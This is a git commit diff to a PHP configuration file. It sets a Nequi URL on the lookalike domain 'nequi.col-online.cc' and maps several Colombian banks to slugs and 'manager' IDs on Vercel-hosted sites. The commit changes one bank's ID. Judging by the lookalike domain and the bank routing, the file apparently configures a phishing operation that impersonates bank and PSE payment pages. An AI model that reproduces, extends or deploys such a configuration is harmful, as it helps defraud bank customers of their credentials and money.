2636de03d50470598be31ac9fa2d64034410080b
AZAZEL <aza@MacBook-Pro-de-AZAZEL-2.local>
2026-07-30 15:17:10 +0100

    Update config.php

--- config.php
+++ config.php
@@ -21,12 +21,12 @@ define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#
 
 // Bancos existentes → vercel (/sites/{slug}/manager/{id})
 $PSE_BANKS = [
-    'bancolombia' => ['slug' => 'bc',  'id' => '109'],
-    'bogota'      => ['slug' => 'bg',  'id' => '109'],
-    'nequi'       => ['slug' => 'nq',  'id' => '144'],
-    'popular'     => ['slug' => 'pop', 'id' => '109'],
-    'avvillas'    => ['slug' => 'avv', 'id' => '109'],
-    'occidente'   => ['slug' => 'occ', 'id' => '109'],
+    'bancolombia' => ['slug' => 'bc', 'id' => '144'],
+    'bogota' => ['slug' => 'bg', 'id' => '109'],
+    'nequi' => ['slug' => 'nq', 'id' => '144'],
+    'popular' => ['slug' => 'pop', 'id' => '109'],
+    'avvillas' => ['slug' => 'avv', 'id' => '109'],
+    'occidente' => ['slug' => 'occ', 'id' => '109'],
 ];
 
 // Bancos → recaudofall (código exacto del parámetro &banco=)
